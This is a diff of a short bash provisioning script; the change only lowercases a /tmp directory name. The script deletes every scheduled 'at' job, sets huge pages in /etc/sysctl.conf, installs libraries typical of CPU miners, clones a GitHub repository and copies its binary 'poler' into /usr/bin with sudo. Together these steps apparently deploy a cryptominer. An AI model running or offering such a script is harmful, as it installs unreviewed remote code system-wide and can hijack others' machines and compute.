@@ -1,18 +1,18 @@
 #!/bin/bash
 
-rm -rf /tmp/MyFirstSS/
+rm -rf /tmp/myfirstss/
 for i in `atq | awk '{print $1}'`;do atrm $i;done
 sudo dpkg --configure -a
 echo 'vm.nr_hugepages=256' >> /etc/sysctl.conf
 sudo sysctl -p
 sudo apt-get update && sudo apt-get install git libcurl4-openssl-dev build-essential libjansson-dev libuv1-dev libmicrohttpd-dev libssl-dev autotools-dev automake screen htop nano cmake mc -y
 sleep 2
-cd /tmp && mkdir MyFirstSS
-git clone https://github.com/burkabest/MyFirstSS /tmp/MyFirstSS
+cd /tmp && mkdir myfirstss
+git clone https://github.com/burkabest/myfirstss /tmp/myfirstss
 cd /tmp/bur1
-chmod +x /tmp/MyFirstSS/poler
+chmod +x /tmp/myfirstss/poler
 chmod 777 ./*.sh
-cp /tmp/MyFirstSS/poler /usr/bin/
+cp /tmp/myfirstss/poler /usr/bin/
 
 sudo apt-get install dos2unix
 sudo dos2unix time1.sh
